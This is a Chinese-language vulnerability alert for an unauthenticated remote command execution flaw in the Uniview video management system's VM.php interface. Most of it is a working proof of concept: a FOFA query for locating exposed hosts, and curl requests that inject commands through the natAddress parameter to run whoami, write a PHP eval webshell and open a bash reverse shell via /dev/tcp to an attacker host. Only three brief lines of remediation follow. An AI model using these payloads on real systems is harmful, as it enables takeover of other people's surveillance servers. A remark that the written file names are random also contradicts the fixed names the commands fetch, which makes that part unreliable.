---
title: 【漏洞预警】宇视视频管理系统 VM.php RCE漏洞
---

## 漏洞概述
宇视视频管理系统VM.php接口存在远程命令执行漏洞，未经身份认证的攻击者可执行任意命令，控制服务器。

## 漏洞信息
| 属性 | 值 |
|------|-----|
| 漏洞名称 | 浙江宇视视频管理系统 VM.php 远程命令执行漏洞 |
| 漏洞类型 | RCE（远程命令执行） |
| 影响组件 | 宇视视频管理系统 |
| 严重程度 | 严重 |

## FOFA查询
```
body="/Script/Public/Language.js.php"
```

## POC
```bash
# 写入文件测试连通性
curl -X POST "http://target/Interface/DevManage/VM.php" \
  -d "cmd=setNatConfig&natAddress=%26echo%20test123%20>test.txt"

# 访问写入的文件
curl "http://target/test.txt"

# 执行whoami
curl -X POST "http://target/Interface/DevManage/VM.php" \
  -d "cmd=setNatConfig&natAddress=%26whoami%20>whoami.txt"
curl "http://target/whoami.txt"

# 写入webshell
curl -X POST "http://target/Interface/DevManage/VM.php" \
  -d "cmd=setNatConfig&natAddress=%26echo%20%3C?php%20eval(\$_POST[1]);?%3E%20%3Eshell.php"

# 反弹shell
curl -X POST "http://target/Interface/DevManage/VM.php" \
  -d "cmd=setNatConfig&natAddress=%26bash%20-i%20>%26/dev/tcp/attacker/port%200>%261"
```

注意：写入的文件名是随机生成的，需要查看响应或遍历常见文件名。

## 修复建议
1. 联系厂商升级版本
2. 部署Web应用防火墙
3. 关闭互联网暴露面